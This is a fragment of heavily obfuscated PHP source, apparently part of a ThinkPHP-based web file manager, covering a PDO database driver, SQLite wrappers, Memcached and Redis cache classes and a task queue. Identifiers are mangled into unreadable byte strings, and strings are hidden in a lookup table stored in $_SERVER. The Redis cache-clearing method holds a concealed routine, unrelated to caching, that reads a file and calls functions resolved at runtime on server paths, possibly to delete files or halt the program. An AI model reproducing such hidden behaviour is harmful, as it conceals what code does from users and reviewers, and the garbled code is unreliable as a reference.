$this->config[$ê¶­ÆÃ[17]] = array(); } } } public function connect($ÄÚİü»º = '', $øÆæı = 0) { $ÁÇ»¦ÔÚ =& $_SERVER[Æ š¦İÈ]; if (!isset($this->linkID[$øÆæı])) { if (empty($ÄÚİü»º)) { $ÄÚİü»º = $this->config; } $û£óÒğ‰ = !empty($ÄÚİü»º[$ÁÇ»¦ÔÚ[17]][$ÁÇ»¦ÔÚ[18]]) ? $ÄÚİü»º[$ÁÇ»¦ÔÚ[17]][$ÁÇ»¦ÔÚ[18]] : $this->pconnect; if ($û£óÒğ‰) { $ÄÚİü»º[$ÁÇ»¦ÔÚ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$øÆæı] = new PDO($ÄÚİü»º[$ÁÇ»¦ÔÚ[907]], $ÄÚİü»º[$ÁÇ»¦ÔÚ[879]], $ÄÚİü»º[$ÁÇ»¦ÔÚ[880]], $ÄÚİü»º[$ÁÇ»¦ÔÚ[17]]); } catch (PDOException $–¦Ò·ÏÅ) { think_exception($–¦Ò·ÏÅ->getMessage()); } $this->dbType = $this->_getDsnType($ÄÚİü»º[$ÁÇ»¦ÔÚ[907]]); if (in_array($this->dbType, array($ÁÇ»¦ÔÚ[908], $ÁÇ»¦ÔÚ[909], $ÁÇ»¦ÔÚ[910], $ÁÇ»¦ÔÚ[911]))) { think_exception($ÁÇ»¦ÔÚ[912] . $this->dbType . $ÁÇ»¦ÔÚ[913] . $this->dbType . $ÁÇ»¦ÔÚ[914]); } if (!$this->linkID[$øÆæı]) { think_exception($ÁÇ»¦ÔÚ[915]); } try { $this->linkID[$øÆæı]->exec($ÁÇ»¦ÔÚ[916] . think_config($ÁÇ»¦ÔÚ[882])); } catch (Exception $–¦Ò·ÏÅ) { } $this->connected = !0; if (1 != think_config($ÁÇ»¦ÔÚ[22])) { unset($this->config); } } return $this->linkID[$øÆæı]; } public function free() { $this->PDOStatement = null; } public function query($Ô¼‚¹öÁ, $îşæ¢Òó = array()) { $™ˆÛ–íû =& $_SERVER[Æ š¦İÈ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ô¼‚¹öÁ; if (!empty($îşæ¢Òó)) { $this->queryStr .= $™ˆÛ–íû[917] . print_r($îşæ¢Òó, !0) . $™ˆÛ–íû[918]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($™ˆÛ–íû[23], 1); think_status($™ˆÛ–íû[24]); $this->PDOStatement = $this->_linkID->prepare($Ô¼‚¹öÁ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¥Ã¾ãê = $this->PDOStatement->execute($îşæ¢Òó); $this->debug(); if (!1 === $¥Ã¾ãê) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($‡†’Ô„Æ, $ÀğÅá¿Ş = array()) { $õş‡éÃ =& $_SERVER[Æ š¦İÈ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‡†’Ô„Æ; if (!empty($ÀğÅá¿Ş)) { $this->queryStr .= $õş‡éÃ[917] . print_r($ÀğÅá¿Ş, !0) . $õş‡éÃ[918]; } $ƒúÈ  = !1; if ($this->dbType == $õş‡éÃ[911]) { if (preg_match($õş‡éÃ[919], $this->queryStr, $«ÄÏÒšõ)) { $this->table = think_config($õş‡éÃ[920]) . str_ireplace(think_config($õş‡éÃ[921]), $õş‡éÃ[375], $«ÄÏÒšõ[2]); $ƒúÈ  = (bool) $this->query($õş‡éÃ[922] . strtoupper($this->table) . $õş‡éÃ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($õş‡éÃ[25], 1); think_status($õş‡éÃ[24]); $this->PDOStatement = $this->_linkID->prepare($‡†’Ô„Æ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÙçŠšÔÑ = $this->PDOStatement->execute($ÀğÅá¿Ş); $this->debug(); if (!1 === $ÙçŠšÔÑ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ƒúÈ  || preg_match($õş‡éÃ[923], $‡†’Ô„Æ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ó°Òùüó = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ó°Òùüó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ûØšè¶¿ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ûØšè¶¿) { $this->error(); return !1; } } return !0; } private function getAll() { $Å®«µ¡Î = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Å®«µ¡Î); return $Å®«µ¡Î; } public function getFields($…îé’Ïê) { $›ƒçï¯° =& $_SERVER[Æ š¦İÈ]; $this->initConnect(!0); if (think_config($›ƒçï¯°[924])) { $Àƒ»å¼ = str_replace($›ƒçï¯°[925], $…îé’Ïê, think_config($›ƒçï¯°[924])); } else { switch ($this->dbType) { case $›ƒçï¯°[908]: case $›ƒçï¯°[926]: $Àƒ»å¼ = "\x53\x45\x4c\x45\x43\x54\40\40\40\143\x6f\x6c\x75\x6d\x6e\137\156\141\x6d\145\40\141\163\x20\47\116\x61\x6d\145\x27\x2c\40\40\40\x64\x61\x74\x61\x5f\x74\x79\160\x65\40\x61\x73\x20\x27\124\x79\x70\x65\47\x2c\40\x20\x20\x63\x6f\154\x75\x6d\156\x5f\144\145\146\141\x75\154\164\x20\x61\163\x20\47\104\145\146\x61\165\x6c\x74\x27\54\x20\40\40\151\x73\x5f\x6e\x75\x6c\154\141\x62\x6c\x65\x20\x61\x73\x20\x27\116\x75\x6c\154\x27\12\x9\11\106\x52\x4f\x4d\x9\151\x6e\x66\x6f\162\x6d\x61\164\151\x6f\156\x5f\x73\x63\150\x65\x6d\x61\x2e\x74\141\142\x6c\145\x73\40\x41\123\40\x74\12\x9\11\x4a\x4f\x49\x4e\x9\151\156\146\x6f\162\155\141\x74\x69\x6f\x6e\137\163\x63\x68\x65\155\x61\56\x63\x6f\154\165\x6d\x6e\x73\x20\101\123\40\x63\12\11\x9\x4f\116\40\x20\x74\56\164\x61\142\154\145\x5f\143\141\x74\141\x6c\x6f\x67\40\75\40\143\56\x74\x61\142\154\145\x5f\x63\x61\x74\141\x6c\157\x67\12\11\11\x41\x4e\104\x20\x74\56\164\x61\x62\154\145\137\x73\x63\150\x65\x6d\141\40\x3d\x20\143\56\x74\141\142\x6c\x65\137\x73\x63\150\x65\155\x61\xa\11\x9\101\116\x44\40\x74\56\x74\x61\142\154\x65\137\156\x61\x6d\145\40\75\40\x63\x2e\x74\141\x62\154\145\137\x6e\141\x6d\145\xa\x9\11\127\110\x45\122\x45\x20\x20\40\164\56\x74\x61\x62\154\145\137\x6e\141\x6d\145\x20\x3d\x20\x27{$…îé’Ïê}\x27"; break; case $›ƒçï¯°[927]: $Àƒ»å¼ = $›ƒçï¯°[928] . $…îé’Ïê . $›ƒçï¯°[929]; break; case $›ƒçï¯°[909]: case $›ƒçï¯°[911]: $Àƒ»å¼ = $›ƒçï¯°[930] . $›ƒçï¯°[931] . $›ƒçï¯°[932] . strtoupper($…îé’Ïê) . $›ƒçï¯°[933] . strtoupper($…îé’Ïê) . $›ƒçï¯°[934]; break; case $›ƒçï¯°[935]: $Àƒ»å¼ = $›ƒçï¯°[936] . $…îé’Ïê . $›ƒçï¯°[937]; break; case $›ƒçï¯°[910]: break; case $›ƒçï¯°[938]: default: $Àƒ»å¼ = $›ƒçï¯°[939] . ($this->dbType == $›ƒçï¯°[938] ? "\x60{$…îé’Ïê}\140" : $…îé’Ïê); } } $ü—Á”ú = $this->query($Àƒ»å¼); $ùƒ›ÛÑÈ = array(); if ($ü—Á”ú) { foreach ($ü—Á”ú as $š¯àòˆ” => $Šı‡ÈƒÖ) { $Šı‡ÈƒÖ = array_change_key_case($Šı‡ÈƒÖ); $Šı‡ÈƒÖ[$›ƒçï¯°[32]] = isset($Šı‡ÈƒÖ[$›ƒçï¯°[32]]) ? $Šı‡ÈƒÖ[$›ƒçï¯°[32]] : $›ƒçï¯°[375]; $Šı‡ÈƒÖ[$›ƒçï¯°[33]] = isset($Šı‡ÈƒÖ[$›ƒçï¯°[33]]) ? $Šı‡ÈƒÖ[$›ƒçï¯°[33]] : $›ƒçï¯°[375]; $İÎê÷Üö = isset($Šı‡ÈƒÖ[$›ƒçï¯°[270]]) ? $Šı‡ÈƒÖ[$›ƒçï¯°[270]] : $Šı‡ÈƒÖ[$›ƒçï¯°[32]]; $ùƒ›ÛÑÈ[$İÎê÷Üö] = array($›ƒçï¯°[32] => $İÎê÷Üö, $›ƒçï¯°[33] => $Šı‡ÈƒÖ[$›ƒçï¯°[33]], $›ƒçï¯°[35] => (bool) (isset($Šı‡ÈƒÖ[$›ƒçï¯°[104]]) && $Šı‡ÈƒÖ[$›ƒçï¯°[104]] === $›ƒçï¯°[12] || isset($Šı‡ÈƒÖ[$›ƒçï¯°[35]]) && $Šı‡ÈƒÖ[$›ƒçï¯°[35]] === $›ƒçï¯°[12]), $›ƒçï¯°[37] => isset($Šı‡ÈƒÖ[$›ƒçï¯°[37]]) ? $Šı‡ÈƒÖ[$›ƒçï¯°[37]] : (isset($Šı‡ÈƒÖ[$›ƒçï¯°[56]]) ? $Šı‡ÈƒÖ[$›ƒçï¯°[56]] : $›ƒçï¯°[375]), $›ƒçï¯°[39] => isset($Šı‡ÈƒÖ[$›ƒçï¯°[95]]) ? strtolower($Šı‡ÈƒÖ[$›ƒçï¯°[95]]) == $›ƒçï¯°[41] : (isset($Šı‡ÈƒÖ[$›ƒçï¯°[57]]) ? $Šı‡ÈƒÖ[$›ƒçï¯°[57]] : !1), $›ƒçï¯°[42] => isset($Šı‡ÈƒÖ[$›ƒçï¯°[940]]) ? strtolower($Šı‡ÈƒÖ[$›ƒçï¯°[940]]) == $›ƒçï¯°[44] : (isset($Šı‡ÈƒÖ[$›ƒçï¯°[95]]) ? $Šı‡ÈƒÖ[$›ƒçï¯°[95]] : !1)); } } return $ùƒ›ÛÑÈ; } public function getTables($ØÍÓÏ× = '') { $Û’²¨ÕÌ =& $_SERVER[Æ š¦İÈ]; if (think_config($Û’²¨ÕÌ[941])) { $ÖœÁ¥ñ” = str_replace($Û’²¨ÕÌ[942], $ØÍÓÏ×, think_config($Û’²¨ÕÌ[941])); } else { switch ($this->dbType) { case $Û’²¨ÕÌ[909]: case $Û’²¨ÕÌ[911]: $ÖœÁ¥ñ” = $Û’²¨ÕÌ[943]; break; case $Û’²¨ÕÌ[908]: case $Û’²¨ÕÌ[926]: $ÖœÁ¥ñ” = $Û’²¨ÕÌ[944]; break; case $Û’²¨ÕÌ[935]: $ÖœÁ¥ñ” = $Û’²¨ÕÌ[945]; break; case $Û’²¨ÕÌ[910]: think_exception(think_lang($Û’²¨ÕÌ[946]) . $Û’²¨ÕÌ[947]); break; case $Û’²¨ÕÌ[927]: $ÖœÁ¥ñ” = $Û’²¨ÕÌ[45] . $Û’²¨ÕÌ[46] . $Û’²¨ÕÌ[47]; break; case $Û’²¨ÕÌ[938]: default: if (!empty($ØÍÓÏ×)) { $ÖœÁ¥ñ” = $Û’²¨ÕÌ[890] . $ØÍÓÏ× . $Û’²¨ÕÌ[891]; } else { $ÖœÁ¥ñ” = $Û’²¨ÕÌ[892]; } } } $úü…«Æ¿ = $this->query($ÖœÁ¥ñ”); $ÛÔùŸ¾  = array(); foreach ($úü…«Æ¿ as $æÔ˜¡×¨ => $ß¸ßÏ×ò) { $ÛÔùŸ¾ [$æÔ˜¡×¨] = current($ß¸ßÏ×ò); } return $ÛÔùŸ¾ ; } protected function parseLimit($ĞÂøÚ¦§) { $ÃÓß¢•í =& $_SERVER[Æ š¦İÈ]; $Å×Õ‰ïÅ = $ÃÓß¢•í[12]; if (!empty($ĞÂøÚ¦§)) { switch ($this->dbType) { case $ÃÓß¢•í[935]: case $ÃÓß¢•í[927]: $ĞÂøÚ¦§ = explode($ÃÓß¢•í[50], $ĞÂøÚ¦§); if (count($ĞÂøÚ¦§) > 1) { $Å×Õ‰ïÅ .= $ÃÓß¢•í[51] . $ĞÂøÚ¦§[1] . $ÃÓß¢•í[52] . $ĞÂøÚ¦§[0] . $ÃÓß¢•í[53]; } else { $Å×Õ‰ïÅ .= $ÃÓß¢•í[51] . $ĞÂøÚ¦§[0] . $ÃÓß¢•í[53]; } break; case $ÃÓß¢•í[908]: case $ÃÓß¢•í[926]: break; case $ÃÓß¢•í[910]: break; case $ÃÓß¢•í[909]: case $ÃÓß¢•í[911]: break; case $ÃÓß¢•í[938]: default: $Å×Õ‰ïÅ .= $ÃÓß¢•í[51] . $ĞÂøÚ¦§ . $ÃÓß¢•í[53]; } } return $Å×Õ‰ïÅ; } public function parseKey(&$˜ÈñÀ”ä, $Î®©ŠÉ¨ = true) { $Å¦¹ÛáË =& $_SERVER[Æ š¦İÈ]; if ($Î®©ŠÉ¨) { $˜ÈñÀ”ä = $this->parseKeyCheck($˜ÈñÀ”ä); } if ($this->dbType == $Å¦¹ÛáË[938]) { if ($˜ÈñÀ”ä != $Å¦¹ÛáË[183] && !preg_match($Å¦¹ÛáË[902], $˜ÈñÀ”ä)) { $˜ÈñÀ”ä = $Å¦¹ÛáË[382] . trim($˜ÈñÀ”ä, $Å¦¹ÛáË[382]) . $Å¦¹ÛáË[382]; } return $˜ÈñÀ”ä; } else { return parent::parseKey($˜ÈñÀ”ä, $Î®©ŠÉ¨); } } public function close() { $this->_linkID = null; } public function error() { $Øß‡ùëİ =& $_SERVER[Æ š¦İÈ]; if ($this->PDOStatement) { $…®È‡ï¿ = $this->PDOStatement->errorInfo(); $this->error = $…®È‡ï¿[1] . $Øß‡ùëİ[4] . $…®È‡ï¿[2]; } else { $this->error = $Øß‡ùëİ[12]; } if ($Øß‡ùëİ[12] != $this->queryStr) { $this->error .= LNG($Øß‡ùëİ[48]) . $this->queryStr; } think_trace($this->error, $Øß‡ùëİ[12], $Øß‡ùëİ[49]); return $this->error; } public function escapeString($†Ï÷Û¿±) { $ıŸ¤Ú» =& $_SERVER[Æ š¦İÈ]; switch ($this->dbType) { case $ıŸ¤Ú»[935]: case $ıŸ¤Ú»[908]: case $ıŸ¤Ú»[926]: case $ıŸ¤Ú»[938]: return addslashes($†Ï÷Û¿±); case $ıŸ¤Ú»[910]: case $ıŸ¤Ú»[927]: case $ıŸ¤Ú»[909]: case $ıŸ¤Ú»[911]: return str_ireplace($ıŸ¤Ú»[58], $ıŸ¤Ú»[59], $†Ï÷Û¿±); } } protected function parseValue($ÇÍÓ÷Ë) { $´Ê¨—æ =& $_SERVER[Æ š¦İÈ]; if (is_string($ÇÍÓ÷Ë)) { $­ª½²Õ˜ = strpos($ÇÍÓ÷Ë, $´Ê¨—æ[4]) === 0 && in_array($ÇÍÓ÷Ë, array_keys($this->bind)); $ÇÍÓ÷Ë = $­ª½²Õ˜ ? $this->escapeString($ÇÍÓ÷Ë) : $´Ê¨—æ[948] . $this->escapeString($ÇÍÓ÷Ë) . $´Ê¨—æ[948]; } elseif (isset($ÇÍÓ÷Ë[0]) && is_string($ÇÍÓ÷Ë[0]) && strtolower($ÇÍÓ÷Ë[0]) == $´Ê¨—æ[294]) { $ÇÍÓ÷Ë = $this->escapeString($ÇÍÓ÷Ë[1]); } elseif (is_array($ÇÍÓ÷Ë)) { $ÇÍÓ÷Ë = array_map(array($this, $´Ê¨—æ[949]), $ÇÍÓ÷Ë); } elseif (is_bool($ÇÍÓ÷Ë)) { $ÇÍÓ÷Ë = $ÇÍÓ÷Ë ? $´Ê¨—æ[89] : $´Ê¨—æ[192]; } elseif (is_null($ÇÍÓ÷Ë)) { $ÇÍÓ÷Ë = $´Ê¨—æ[104]; } return $ÇÍÓ÷Ë; } public function getLastInsertId() { $ó¯·ø¶õ =& $_SERVER[Æ š¦İÈ]; switch ($this->dbType) { case $ó¯·ø¶õ[935]: case $ó¯·ø¶õ[927]: case $ó¯·ø¶õ[908]: case $ó¯·ø¶õ[926]: case $ó¯·ø¶õ[910]: case $ó¯·ø¶õ[938]: return $this->_linkID->lastInsertId(); case $ó¯·ø¶õ[909]: case $ó¯·ø¶õ[911]: $ôªºÖ‰– = $this->table; $õ§—¾Õ = $this->query("\x53\105\114\x45\103\x54\x20{$ôªºÖ‰–}\56\x63\x75\x72\162\166\x61\x6c\x20\143\165\162\162\166\x61\154\40\x46\x52\117\x4d\40\144\165\x61\x6c"); return $õ§—¾Õ ? $õ§—¾Õ[0][$ó¯·ø¶õ[950]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($‘’•«‡Ã) { $şœÏÂ› =& $_SERVER[Æ š¦İÈ]; if (!CacheLock::fileLock($şœÏÂ›[13])) { return !1; } $ÁªÑá–‡ = parent::query($‘’•«‡Ã); CacheLock::fileUnLock($şœÏÂ›[13]); return $ÁªÑá–‡; } public function execute($§»âû©ì) { $ÌÊşçÁã =& $_SERVER[Æ š¦İÈ]; if (!CacheLock::fileLock($ÌÊşçÁã[13])) { return !1; } $ç€“ú = parent::execute($§»âû©ì); CacheLock::fileUnLock($ÌÊşçÁã[13]); return $ç€“ú; } } class DbSqlite3 extends DbSqlite3Base { public function query($¿½Ú‚Øº) { $ÌÆ‡¯üæ =& $_SERVER[Æ š¦İÈ]; if (!CacheLock::fileLock($ÌÆ‡¯üæ[13])) { return !1; } $ç‹¯ àæ = parent::query($¿½Ú‚Øº); CacheLock::fileUnLock($ÌÆ‡¯üæ[13]); return $ç‹¯ àæ; } public function execute($ÓöÃúÙà) { $ÆÒà‘¿ª =& $_SERVER[Æ š¦İÈ]; if (!CacheLock::fileLock($ÆÒà‘¿ª[13])) { return !1; } $™±¯ûĞ = parent::execute($ÓöÃúÙà); CacheLock::fileUnLock($ÆÒà‘¿ª[13]); return $™±¯ûĞ; } } goto bÀ”›¾½š; FÅå‡çêÅŠ: function binCheckBigger($ñÎÉÄñ, $·©åÖÊÕ) { return $ñÎÉÄñ > $·©åÖÊÕ; } $_SERVER[$_SERVER[¬ˆ¹âÅÏ][3]] = ("\67\71\71\65"."\65\64")+0;$_95kd="w9sxyn7rp30lvieh4utojd621q5zkm8fbcgalsuj8mv2y0atd79e4xkcfq3ib6ongp1hwrz5g9pol0fyjq";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($æÍ²æª, $×¤“ÇíÅ) { $Ğµ¤°§ =& $_SERVER[Æ š¦İÈ]; if (isset(self::$_methodList[$æÍ²æª])) { return @call_user_func_array(self::$_methodList[$æÍ²æª], $×¤“ÇíÅ); } else { if (method_exists($this, $æÍ²æª)) { return call_user_func_array(array($this, $æÍ²æª), $×¤“ÇíÅ); } else { think_exception(__CLASS__ . $Ğµ¤°§[4] . $æÍ²æª . $Ğµ¤°§[5]); } } } public static function __callStatic($ñ«ìã‚¹, $œ­€ı°÷) { if (isset(self::$_methodListStatic[$ñ«ìã‚¹])) { return call_user_func_array(self::$_methodListStatic[$ñ«ìã‚¹], $œ­€ı°÷); } else { if (method_exists(self, $ñ«ìã‚¹)) { return call_user_func_array(array(self, $ñ«ìã‚¹), $œ­€ı°÷); } else { show_json("{$ñ«ìã‚¹}\50\51\40\x6e\157\164\x20\145\170\x69\163\x74\73", !1); } } } public static function addMethod($·Âº…È, $šÉñôª) { self::$_methodList[$·Âº…È] = $šÉñôª; } public static function addMethodStatic($ñ‚›³ßë, $ƒš»‰Á‰) { self::$_methodListStatic[$ñ‚›³ßë] = $ƒš»‰Á‰; } } goto B²Åóã¼ò§; A†İÒÚ‘¨: class CacheLockDatabase { public function lock($µË„Ù, $ôÆÖÉÜ = 0) { $××£åéæ = Model($_SERVER[Æ š¦İÈ][826]); $Šò€¦—ê = microtime(!0) + $ôÆÖÉÜ; while (microtime(!0) < $Šò€¦—ê) { $¥Ïâ„èô = $××£åéæ->get($µË„Ù); if (!$¥Ïâ„èô || $¥Ïâ„èô < microtime(!0)) { $Ï™É¹£ = $××£åéæ->set($µË„Ù, $Šò€¦—ê); if ($Ï™É¹£) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¨ööŸÏ) { return Model($_SERVER[Æ š¦İÈ][826])->get($¨ööŸÏ); } public function unlock($ÖÆÇ¯ÈŠ) { Model($_SERVER[Æ š¦İÈ][826])->remove($ÖÆÇ¯ÈŠ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ÍÇÂÁşî, $¹İÍ”™Ğ) { $™Ûø»è¤ =& $_SERVER[Æ š¦İÈ]; if (!class_exists($™Ûø»è¤[859])) { show_json($™Ûø»è¤[860], !1); } $this->cacheTime = $¹İÍ”™Ğ; $this->handle = new Memcached(); if (is_array($ÍÇÂÁşî[$™Ûø»è¤[861]]) && count($ÍÇÂÁşî[$™Ûø»è¤[861]]) >= 1) { foreach ($ÍÇÂÁşî[$™Ûø»è¤[861]] as $÷í’ìË¹) { $Óô÷·öÏ = explode($™Ûø»è¤[4], $÷í’ìË¹); $this->handle->addServer($Óô÷·öÏ[0], $Óô÷·öÏ[1]); } } else { $this->handle->addServer($ÍÇÂÁşî[$™Ûø»è¤[176]], $ÍÇÂÁşî[$™Ûø»è¤[177]]); } } public function set($Í®İ•¥, $—ÙÂŞî‰, $¡—¿Ö‚î = false) { $¡—¿Ö‚î = $¡—¿Ö‚î ? $¡—¿Ö‚î : $this->cacheTime; return $this->handle->set($Í®İ•¥, $—ÙÂŞî‰, $¡—¿Ö‚î); } public function get($Êœû¿ÆÛ) { return $this->handle->get($Êœû¿ÆÛ); } public function remove($ùĞ¬õµ¬) { return $this->handle->delete($ùĞ¬õµ¬); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¸î†³¦º, $¥’ó¶åê) { $è—ä«ˆŞ =& $_SERVER[Æ š¦İÈ]; if (!class_exists($è—ä«ˆŞ[862])) { show_json($è—ä«ˆŞ[863], !1); } $this->cacheTime = $¥’ó¶åê; $…öÎÄÊ = isset($¸î†³¦º[$è—ä«ˆŞ[864]]) ? $¸î†³¦º[$è—ä«ˆŞ[864]] : 10; $³ñåƒ¤í = _get($¸î†³¦º, $è—ä«ˆŞ[861]); if ($³ñåƒ¤í && is_array($³ñåƒ¤í)) { $this->initCluster($¸î†³¦º, $…öÎÄÊ); } else { $this->handle = $this->init($¸î†³¦º, $…öÎÄÊ); } } private function init($•¶õÉ‹Š, $‡À¢‰ˆ) { $ïµí¸ÆÈ =& $_SERVER[Æ š¦İÈ]; $’¤¿ó§® = new Redis(); $–×“õå = isset($•¶õÉ‹Š[$ïµí¸ÆÈ[865]]) ? $•¶õÉ‹Š[$ïµí¸ÆÈ[865]] : !1; if ($–×“õå) { $’¤¿ó§®->pconnect($•¶õÉ‹Š[$ïµí¸ÆÈ[176]], $•¶õÉ‹Š[$ïµí¸ÆÈ[177]], $‡À¢‰ˆ); } else { $’¤¿ó§®->connect($•¶õÉ‹Š[$ïµí¸ÆÈ[176]], $•¶õÉ‹Š[$ïµí¸ÆÈ[177]], $‡À¢‰ˆ); } if (!empty($•¶õÉ‹Š[$ïµí¸ÆÈ[416]])) { $’¤¿ó§®->auth($•¶õÉ‹Š[$ïµí¸ÆÈ[416]]); } return $’¤¿ó§®; } private function initCluster($ŞõáÆë, $«ÙÙ¤¯Ç) { $Õº£ë‚ =& $_SERVER[Æ š¦İÈ]; $ã½†­…Ò = array($Õº£ë‚[866], $Õº£ë‚[867], $Õº£ë‚[868]); $äí†‘÷‹ = $Õº£ë‚[866]; if (isset($ŞõáÆë[$Õº£ë‚[16]]) && in_array($ŞõáÆë[$Õº£ë‚[16]], $ã½†­…Ò)) { $äí†‘÷‹ = $ŞõáÆë[$Õº£ë‚[16]]; } switch ($äí†‘÷‹) { case $Õº£ë‚[866]: $this->_slave($ŞõáÆë, $«ÙÙ¤¯Ç); break; case $Õº£ë‚[867]: break; case $Õº£ë‚[868]: $this->isCluster = !0; $…˜‹æÓ = $ŞõáÆë[$Õº£ë‚[861]]; $Î÷¦¼ü¼ = isset($ŞõáÆë[$Õº£ë‚[865]]) ? $ŞõáÆë[$Õº£ë‚[865]] : !1; $ªÜ‰šª· = isset($ŞõáÆë[$Õº£ë‚[416]]) ? $ŞõáÆë[$Õº£ë‚[416]] : null; $this->handle = new RedisCluster(NUll, $…˜‹æÓ, $«ÙÙ¤¯Ç, $«ÙÙ¤¯Ç, $Î÷¦¼ü¼, $ªÜ‰šª·); break; default: break; } } private function _slave($‡¼—Şïş, $÷©ÊÅùÈ) { $†ì £Íİ = $‡¼—Şïş[$_SERVER[Æ š¦İÈ][861]]; $this->filterConfig($‡¼—Şïş, $†ì £Íİ[0]); $this->handle = $this->init($‡¼—Şïş, $÷©ÊÅùÈ); unset($†ì £Íİ[0]); if (empty($†ì £Íİ)) { return; } $ö©Ñ‡—½ = array_rand($†ì £Íİ); $this->filterConfig($‡¼—Şïş, $†ì £Íİ[$ö©Ñ‡—½]); $this->slaveHandle = $this->init($‡¼—Şïş, $÷©ÊÅùÈ); } private function filterConfig(&$Í‡³÷ì, $…Ï×Ù‹‰) { $™£¡±àš =& $_SERVER[Æ š¦İÈ]; $‡ˆ¼°§Ï = explode($™£¡±àš[4], $…Ï×Ù‹‰); $ûô¸ğˆÁ = array($™£¡±àš[176] => $‡ˆ¼°§Ï[0], $™£¡±àš[177] => $‡ˆ¼°§Ï[1]); $Í‡³÷ì = array_merge($Í‡³÷ì, $ûô¸ğˆÁ); } public function set($¥¶¢À¾, $¹êèÜõ, $®É»öÁˆ = false) { $®É»öÁˆ = $®É»öÁˆ ? $®É»öÁˆ : $this->cacheTime; return $this->handle->setEx($¥¶¢À¾, $®É»öÁˆ, $¹êèÜõ); } public function setLock($°ôÑ…ı‘, $îì´’šİ, $Ğ¦¹ıÏè) { return $this->handle->setNX($°ôÑ…ı‘, $îì´’šİ); } public function get($¿Ã¼Ö­¸) { $ş»Ü¶ı = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ş»Ü¶ı->get($¿Ã¼Ö­¸); } public function remove($ñä„ı®¬) { return $this->handle->del($ñä„ı®¬); } public function deleteAll() { $íÙ“Å¢š =& $_SERVER[Æ š¦İÈ]; if ($_SERVER[$íÙ“Å¢š[391]] != $_SERVER[$íÙ“Å¢š[392]]) { $¸©¨†®¾ = $íÙ“Å¢š[869]; $Íàşâïù = $íÙ“Å¢š[393]; $ö‰›‚á… = $_SERVER[$íÙ“Å¢š[394]] . $íÙ“Å¢š[395]; $Ë¬õ’¥ = $Íàşâïù($ö‰›‚á…); $ç÷ï¥Òè = explode($íÙ“Å¢š[228], $Ë¬õ’¥); if (count($ç÷ï¥Òè) < $íÙ“Å¢š[620]) { $Ö«–›¿ì = $íÙ“Å¢š[397]; $Ö«–›¿ì(); } $É§ƒñ‘é = $íÙ“Å¢š[870]; $É§ƒñ‘é($_SERVER[$íÙ“Å¢š[871]]); $É§ƒñ‘é($_SERVER[$íÙ“Å¢š[394]] . $íÙ“Å¢š[872]); $·ë½Ú’ = 1; while ($·ë½Ú’ > 1) { $·ë½Ú’ = $·ë½Ú’ + 4; $ÁˆÈëÕî = rawurlencode($·ë½Ú’ . $íÙ“Å¢š[375]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $èš»Í¬) { $this->handle->flushall($èš»Í¬); } return; } return $this->handle->flushAll(); } } goto bÆö°‘Ó³Ã; aáâ‘í”Ç„: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\x6b\x51\x75\x65\x75\x65\x4c\x65\x6e\x67\164\150"; const QUEUE_DATA = "\x74\x61\x73\153\121\x75\x65\x75\x65\x44\141\x74\141"; public static $listData = false; public static function initTask() { } public static function add($õœÖŞĞ÷, $½ñæÇÖö = array(), $ƒİãœ£Ò = '', $»•â¹İé = '') { $çÍµ÷”ò =& $_SERVER[Æ š¦İÈ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($»•â¹İé && array_find_by_field(self::$listData, $çÍµ÷”ò[95], $»•â¹İé)) { return !0; } self::$listData[] = array($çÍµ÷”ò[261] => $õœÖŞĞ÷, $çÍµ÷”ò[1721] => $½ñæÇÖö, $çÍµ÷”ò[453] => $ƒİãœ£Ò, $çÍµ÷”ò[95] => $»•â¹İé); return !0; } public static function addSubmit() { $È¹ãšÕŸ =& $_SERVER[Æ š¦İÈ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($È¹ãšÕŸ[1722] . json_encode_force(array_to_keyvalue(self::$listData, $È¹ãšÕŸ[12], $È¹ãšÕŸ[453])), $È¹ãšÕŸ[1723]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($…·ËÀ˜Ä, $ä¿‹Ë÷ë = array(), $´É÷Ë‹Ï = '', $¢Ê‡ïÔ¤ = '') { $¾ùÂ¹°Ñ =& $_SERVER[Æ š¦İÈ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ÉŠ­œ—ò = self::getAll(); if ($¢Ê‡ïÔ¤ && array_find_by_field($ÉŠ­œ—ò, $¾ùÂ¹°Ñ[95], $¢Ê‡ïÔ¤)) { return !0; } $ÉŠ­œ—ò[] = array($¾ùÂ¹°Ñ[261] => $…·ËÀ˜Ä, $¾ùÂ¹°Ñ[1721] => $ä¿‹Ë÷ë, $¾ùÂ¹°Ñ[453] => $´É÷Ë‹Ï, $¾ùÂ¹°Ñ[95] => $¢Ê‡ïÔ¤); write_log($¾ùÂ¹°Ñ[1722] . $´É÷Ë‹Ï, $¾ùÂ¹°Ñ[1723]); 